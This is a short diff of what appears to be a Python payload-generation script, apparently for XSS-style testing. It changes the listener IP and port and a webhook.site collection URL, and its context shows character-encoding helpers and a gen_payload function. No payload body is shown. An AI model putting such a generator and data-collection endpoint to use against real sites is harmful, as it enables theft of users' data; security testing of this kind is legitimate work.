@@ -45,10 +45,10 @@ def custom_html_entity_encode(text: str) -> str:
 def encode_all_chars_to_url(text: str) -> str:
     return ''.join(f"%{ord(c):02X}" for c in text)
 
-server_ip = '192.168.219.107'
-server_port = '4444'
+server_ip = '127.0.0.1'
+server_port = '26003'
 server_url = f'http://{server_ip}:{server_port}'
-webhook_url = 'https://webhook.site/3522a249-b3e6-402b-8790-682dff21b496'
+webhook_url = 'https://webhook.site/404d416f-ad17-48f1-afa7-9b169f402d96'
 
 def gen_payload() -> str:
 
